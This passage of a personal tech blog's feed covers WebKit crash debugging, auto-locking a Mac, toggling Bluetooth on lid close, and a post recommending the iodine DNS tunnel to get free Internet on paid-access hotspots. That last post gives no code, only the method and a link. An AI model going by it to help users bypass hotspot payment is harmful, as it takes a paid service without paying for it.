+
+Application Specific Information:
+CoreSimulator 581.2 - Device: iPhone SE For WebKit Development - Runtime: iOS 12.1 (16B91) - DeviceType: iPhone SE
+
+Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
+0   com.apple.WebCore             	0x000000026a32c1f7 WebCore::GraphicsContext::platformContext() const + 7
+1   com.apple.WebCore             	0x00000002695ff2fc WebCore::RenderThemeIOS::paintFileUploadIconDecorations(WebCore::RenderObject const&amp;, WebCore::RenderObject const&amp;, WebCore::PaintInfo const&amp;, WebCore::IntRect const&amp;, WebCore::Icon*, WebCore::RenderTheme::FileUploadDecorations) + 524
+2   com.apple.WebCore             	0x000000026a4b323f WebCore::RenderFileUploadControl::paintObject(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 2671
+3   com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 271
+4   com.apple.WebCore             	0x000000026a4a9082 WebCore::RenderElement::paintAsInlineBlock(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 162
+5   com.apple.WebCore             	0x000000026a41a687 WebCore::InlineElementBox::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 119
+6   com.apple.WebCore             	0x000000026a420cf0 WebCore::InlineFlowBox::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 1056
+7   com.apple.WebCore             	0x000000026a5ac9e2 WebCore::RootInlineBox::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 34
+8   com.apple.WebCore             	0x000000026a52a122 WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject*, WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) const + 994
+9   com.apple.WebCore             	0x000000026a434b97 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 695
+10  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 271
+11  com.apple.WebCore             	0x000000026a4347fa WebCore::RenderBlock::paintChild(WebCore::RenderBox&amp;, WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::PaintInfo&amp;, bool, WebCore::RenderBlock::PaintBlockType) + 666
+12  com.apple.WebCore             	0x000000026a43452f WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::PaintInfo&amp;, bool) + 95
+13  com.apple.WebCore             	0x000000026a434bc3 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 739
+14  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 271
+15  com.apple.WebCore             	0x000000026a4347fa WebCore::RenderBlock::paintChild(WebCore::RenderBox&amp;, WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::PaintInfo&amp;, bool, WebCore::RenderBlock::PaintBlockType) + 666
+16  com.apple.WebCore             	0x000000026a43452f WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;, WebCore::PaintInfo&amp;, bool) + 95
+17  com.apple.WebCore             	0x000000026a434bc3 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 739
+18  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;, WebCore::LayoutPoint const&amp;) + 271
+19  com.apple.WebCore             	0x000000026a500033 WebCore::RenderLayer::paintForegroundForFragmentsWithPhase(WebCore::PaintPhase, WTF::Vector&lt;WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow, 16ul&gt; const&amp;, WebCore::GraphicsContext&amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;, unsigned int, WebCore::RenderObject*) + 403
+20  com.apple.WebCore             	0x000000026a4fd809 WebCore::RenderLayer::paintForegroundForFragments(WTF::Vector&lt;WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow, 16ul&gt; const&amp;, WebCore::GraphicsContext&amp;, WebCore::GraphicsContext&amp;, WebCore::LayoutRect const&amp;, bool, WebCore::RenderLayer::LayerPaintingInfo const&amp;, unsigned int, WebCore::RenderObject*) + 393
+21  com.apple.WebCore             	0x000000026a4fa829 WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext&amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;, unsigned int) + 2697
+22  com.apple.WebCore             	0x000000026a4fa8e2 WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext&amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;, unsigned int) + 2882
+23  com.apple.WebCore             	0x000000026a4f7e01 WebCore::RenderLayer::paint(WebCore::GraphicsContext&amp;, WebCore::LayoutRect const&amp;, WebCore::LayoutSize const&amp;, unsigned int, WebCore::RenderObject*, unsigned int, WebCore::RenderLayer::SecurityOriginPaintPolicy) + 273
+24  com.apple.WebCore             	0x000000026a1a64a7 WebCore::FrameView::paintContents(WebCore::GraphicsContext&amp;, WebCore::IntRect const&amp;, WebCore::Widget::SecurityOriginPaintPolicy) + 743
+25  com.apple.WebCore             	0x000000026a24e5ee WebCore::ScrollView::paint(WebCore::GraphicsContext&amp;, WebCore::IntRect const&amp;, WebCore::Widget::SecurityOriginPaintPolicy) + 574
+26  com.apple.WebCore             	0x000000026a1a619d WebCore::FrameView::traverseForPaintInvalidation(WebCore::GraphicsContext::PaintInvalidationReasons) + 253
+27  com.apple.WebKit              	0x0000000108a96e8a WebKit::RemoteLayerTreeDrawingArea::flushLayers() + 340
+28  com.apple.WebCore             	0x000000026a259f00 WebCore::ThreadTimers::sharedTimerFiredInternal() + 336
+29  com.apple.WebCore             	0x000000026a2a75ef WebCore::timerFired(__CFRunLoopTimer*, void*) + 31
+30  com.apple.CoreFoundation      	0x0000000109469f34 __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 20
+31  com.apple.CoreFoundation      	0x0000000109469b32 __CFRunLoopDoTimer + 1026
+32  com.apple.CoreFoundation      	0x000000010946939a __CFRunLoopDoTimers + 266
+33  com.apple.CoreFoundation      	0x0000000109463a1c __CFRunLoopRun + 2252
+34  com.apple.CoreFoundation      	0x0000000109462e11 CFRunLoopRunSpecific + 625
+35  com.apple.Foundation          	0x00000001083ee322 -[NSRunLoop(NSRunLoop) runMode:beforeDate:] + 277
+36  com.apple.Foundation          	0x00000001083ee492 -[NSRunLoop(NSRunLoop) run] + 76
+37  libxpc.dylib                  	0x000000010ba72812 _xpc_objc_main + 460
+38  libxpc.dylib                  	0x000000010ba74cbd xpc_main + 143
+39  com.apple.WebKit.WebContent   	0x00000001083332d9 0x108332000 + 4825
+40  libdyld.dylib                 	0x000000010b76b575 start + 1
+...
+</code></pre></div></div>
+
+<h2 id="debugging-using-xcode">Debugging using Xcode</h2>
+
+<p>At this point you should already know the area of code you want to put breakpoints in. For convenience reasons - I chose to use Xcode over lldb for debugging. To do that you must configure Xcode to use the command-line-built binaries instead of rebuilding it itself. Do that by following the <a href="https://webkit.org/debugging-webkit/#debugging-using-xcode">Debugging using Xcode section</a> of the WebKit guide.</p>
+
+<p>Now you can attach Xcode to the right WebKit process within the simulator. <strong>Important notice that also took me a long time to figure out - WebKit has multiple different processes for every tab.</strong> So the process ID printed when you run <code class="language-plaintext highlighter-rouge">Tools/Scripts/run-safari</code> is <strong>not</strong> the one you want to attach to usually. In my example, I saw my crash is in <em>WebCore</em>, so I attached to the <em>com.apple.WebKit.WebContent.Development</em> within the simulator. If my bug was related to the networking part of WebKit, I would have attached to a different process. The different process names are documented <a href="https://webkit.org/debugging-webkit/#processes">here</a>.</p>
+
+<p><strong>You can distinguish the debug versions from the real stable versions by the process names -</strong> WebKit process names that end <code class="language-plaintext highlighter-rouge">.Development</code> are the debug versions.</p>
+
+<h2 id="submitting-the-fix">Submitting the Fix</h2>
+
+<p>If you found and fixed the bug, follow <a href="https://webkit.org/contributing-code/">WebKit’s guide for submitting a patch</a>.</p>
+
+<p>Good luck!</p>]]></content><author><name>Guy Lewin</name></author><category term="crash" /><category term="debug" /><category term="ios" /><category term="lldb" /><category term="unable to attach" /><category term="webcore" /><category term="webkit" /><category term="xcode" /><summary type="html"><![CDATA[I found a bug in WebKit for iOS and wanted to setup a debug environment to find the exact relevant line. This was harder than I thought, so I decided to document the process.]]></summary></entry><entry><title type="html">Lock Mac After Inactivity</title><link href="https://lewin.co.il/2019/03/15/lock-mac-after-inactivity.html" rel="alternate" type="text/html" title="Lock Mac After Inactivity" /><published>2019-03-15T11:27:24+00:00</published><updated>2019-03-15T11:27:24+00:00</updated><id>https://lewin.co.il/2019/03/15/lock-mac-after-inactivity</id><content type="html" xml:base="https://lewin.co.il/2019/03/15/lock-mac-after-inactivity.html"><![CDATA[<p>Mac comes with a shortcut for locking the desktop session - <code class="language-plaintext highlighter-rouge">⌘ + Ctrl + Q</code>. It is also possible to <a href="https://maclovin.org/blog-native/2017/high-sierra-set-a-global-shortcut-to-lock-screen">define another keyboard shortcut for that</a>.</p>
+
+<p>In my case, I wanted the screen to lock automatically after I’m idle for a certain period of time. That’s also easily configured by following these steps:</p>
+
+<ol>
+  <li>Launch System Preferences -&gt; Desktop &amp; Screen Saver -&gt; Screen Saver</li>
+  <li>Change the “Start after:” value in the left bottom corner to the requested idle time (in my case - 1 minute).</li>
+  <li>On System Preferences -&gt; Security &amp; Privacy -&gt; General - mark “Require password <strong>immediately</strong> after sleep or screen saver begins”</li>
+</ol>
+
+<p>This was a good solution, but my workplace setup a group policy (by enforcing a configuration profile) that sets the “Start after” time in the screen saver pane to 20 minutes, which is <em>way</em> too long for me.</p>
+
+<p>To solve that, I wrote this small cron task that checks your inactivity time, and launches the screen saver manually if enough time has passed. You can find the code + installation instructions <a href="https://github.com/GuyLewin/manual-screensaver-cron">here</a>.</p>]]></content><author><name>Guy Lewin</name></author><category term="configuration profile" /><category term="inactivity" /><category term="lock" /><category term="mac" /><category term="manual-screensaver-cron" /><category term="screensaver" /><summary type="html"><![CDATA[Mac comes with a shortcut for locking the desktop session - ⌘ + Ctrl + Q. It is also possible to define another keyboard shortcut for that.]]></summary></entry><entry><title type="html">QuietComfort 35 + MacBook + iPhone Bluetooth Connectivity</title><link href="https://lewin.co.il/2019/03/14/quietcomfort-35-macbook-iphone-bluetooth-connectivity.html" rel="alternate" type="text/html" title="QuietComfort 35 + MacBook + iPhone Bluetooth Connectivity" /><published>2019-03-14T23:36:46+00:00</published><updated>2019-03-14T23:36:46+00:00</updated><id>https://lewin.co.il/2019/03/14/quietcomfort-35-macbook-iphone-bluetooth-connectivity</id><content type="html" xml:base="https://lewin.co.il/2019/03/14/quietcomfort-35-macbook-iphone-bluetooth-connectivity.html"><![CDATA[<p>I received QuietComfort 35 from work, and I loved it from the first moment I used it. It’s always connected to my work Mac, my personal Mac and to my iPhone.</p>
+
+<p>But whenever I leave work / home and close my laptop lid - I would expect the seamless reaction for the headphones to switch automatically to my iPhone audio while disconnecting from my now-sleeping Mac.</p>
+
+<p>The current behaviour is far from that. My Mac stays connected even with it’s lid shut in my backpack, and I have to manually open the Bose app on my phone and switch the Mac connection off.</p>
+
+<p>I was looking for a solution to turn off Bluetooth when lid is shut - but sadly the only one I could find is <a href="https://www.controlplaneapp.com/">ControlPlane</a>, which apparently used to be an app that lets you perform actions on Mac system events (such as lid closed / opened). Sadly I gave it a try and it seems broken on newer Macs.</p>
+
+<p>Today I found this amazing app - <a href="https://www.dssw.co.uk/powermanager/">Power Manager</a>. With this app, along with a small Bluetooth command line utility, my problem was solved easily.</p>
+
+<p>You can download my Power Manager profile <a href="https://www.dropbox.com/s/ax60yhy0anhn0qi/BluetoothSchedule.pm-schedule">here</a>, please note it requires the installation of <a href="https://github.com/toy/blueutil">blueutil</a>, available via Homebrew. The profile basically runs <code class="language-plaintext highlighter-rouge">blueutil -p 0</code> before sleep (lid close), and <code class="language-plaintext highlighter-rouge">blueutil -p 1</code> on wake (lid open).</p>]]></content><author><name>Guy Lewin</name></author><category term="bluetooth" /><category term="blueutil" /><category term="bose" /><category term="controlplane" /><category term="iphone" /><category term="macbook" /><category term="power manager" /><category term="quietcomfort" /><summary type="html"><![CDATA[I received QuietComfort 35 from work, and I loved it from the first moment I used it. It’s always connected to my work Mac, my personal Mac and to my iPhone.]]></summary></entry><entry><title type="html">Iodine and Paid-Access Hotspot Situations</title><link href="https://lewin.co.il/2019/01/19/iodine-and-paid-access-hotspot-situations.html" rel="alternate" type="text/html" title="Iodine and Paid-Access Hotspot Situations" /><published>2019-01-19T14:20:06+00:00</published><updated>2019-01-19T14:20:06+00:00</updated><id>https://lewin.co.il/2019/01/19/iodine-and-paid-access-hotspot-situations</id><content type="html" xml:base="https://lewin.co.il/2019/01/19/iodine-and-paid-access-hotspot-situations.html"><![CDATA[<p>I travel a lot and find myself in many situations where I’m connected to a hotspot but have to pay to get access to the Internet.</p>
+
+<p>If you haven’t heard about <a href="https://code.kryo.se/iodine/">iodine</a> yet, it’s a solution that lets you tunnel IP packets over valid DNS requests. This is a solution just for these problems, as most paid-access hotspots allow valid DNS-requests and responses to go through.</p>
+
+<p>There are many guides on setting up an iodine setup, including <a href="https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/">this one</a> for example. The problem is - the established connection is usually too slow to actually do something with it, from my experience.</p>
+
+<p>iodine lets you SSH into the installed iodine server (over DNS requests/responses). Usually people setup an SSH tunnel and use their personal computer regularly.</p>
+
+<p>If that is too slow for you (like it is for me) - I recommend installing a bunch of utilities <strong>on the server itself</strong> so the server does all massive Internet traffic, and you just get the output through the SSH shell.</p>
+
+<p>My setup is a cheap $10-a-month DigitalOcean server with the following programs installed:</p>
+
+<ul>
+  <li>Reddit client for Terminal - <a href="https://github.com/michael-lazar/rtv">https://github.com/michael-lazar/rtv</a></li>
+  <li>Facebook Messenger client for Terminal - <a href="https://github.com/mjkaufer/Messer">https://github.com/mjkaufer/Messer</a></li>
+</ul>
+
+<p>Since I installed these I don’t need to create the SSH tunnel anymore, I just run them from the SSH shell and enjoy a relatively fast way of communicating for free.</p>]]></content><author><name>Guy Lewin</name></author><category term="dns" /><category term="facebook" /><category term="hotspot" /><category term="iodine" /><category term="messenger" /><category term="reddit" /><category term="wifi" /><summary type="html"><![CDATA[I travel a lot and find myself in many situations where I’m connected to a hotspot but have to pay to get access to the Internet.]]></summary></entry></feed>
